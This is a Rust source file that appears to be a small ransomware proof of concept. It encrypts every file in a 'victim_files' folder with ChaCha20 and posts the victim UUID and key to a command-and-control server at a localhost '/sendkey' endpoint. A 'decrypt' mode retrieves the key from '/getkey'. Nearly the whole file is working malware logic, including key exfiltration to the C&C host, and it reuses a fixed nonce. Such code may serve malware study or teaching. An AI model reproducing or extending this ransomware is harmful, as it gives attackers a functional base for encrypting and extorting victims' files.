#![allow(dead_code)]
#![allow(unused_variables)]
use sodiumoxide::crypto::stream::chacha20;
use std::collections::HashMap;

mod cryptography;
mod files;
mod networking;

const BASE_URL: &str = "http://localhost:8000";



fn encrypt_files() {
	let uuid = uuid::Uuid::new_v4().to_string();
	let key = chacha20::gen_key();
	let nonce = chacha20::Nonce::from_slice(b"verygood").unwrap();

	for file in files::list_files("victim_files").unwrap() {
		let ext = file.extension().unwrap();
		if ext != std::ffi::OsStr::new("encrypted") { // Skip file if it's already encrypted
			let filename = file.to_str().unwrap();
			let newfilename = format!("{}.encrypted", filename);

			let plaintext = files::read_file(filename).unwrap();
			let encrypted = chacha20::stream_xor(&plaintext, &nonce, &key);

			files::write_file(&newfilename, &encrypted).expect("Error writing file");
			println!("ENCRYPTED {}", filename);
		}
	}

	files::write_file("uuid", &uuid.as_bytes().to_vec()).expect("Error writing UUID file");

	let mut json = HashMap::new();
	json.insert("uuid", uuid);
	json.insert("key", cryptography::chacha_export(&key));
	let mut url = String::from(BASE_URL);
	url.push_str("/sendkey");
	networking::post(&url, &json);
}


fn decrypt_files() {
	let nonce = chacha20::Nonce::from_slice(b"verygood").unwrap();

	// Request key from C&C server
	let uuid = String::from_utf8(files::read_file("uuid").unwrap()).unwrap();
	let mut url: String = String::from(BASE_URL);
	url.push_str("/getkey?uuid=");
	url.push_str(&uuid);
	let key_base64 = networking::get(&url).unwrap();
	let key = cryptography::chacha_import(&key_base64);

	// TODO: put this in a nice function as not to repeat ourselves
	for file in files::list_files("victim_files").unwrap() {
		let ext = file.extension().unwrap();
		// TODO: delete old files
		if ext == std::ffi::OsStr::new("encrypted") { // Only try to decrypt encrypted files
			let filename = file.to_str().unwrap();
			let newfilename = filename.replace(".encrypted", ""); // If a file already has ".encrypted" in its name we're fucked, but that won't happen anyway, right?

			let encrypted = files::read_file(filename).unwrap();
			let decrypted = chacha20::stream_xor(&encrypted, &nonce, &key);

			files::write_file(&newfilename, &decrypted).expect("Error writing file");
			println!("DECRYPTED {}", filename);
		}
	}
}


fn main() {
	let args: Vec<String> = std::env::args().collect();
	if args.len() > 1 {
		if args[1] == "decrypt" { decrypt_files(); }
		else { encrypt_files(); }
	}
	else {
		encrypt_files();
	}
}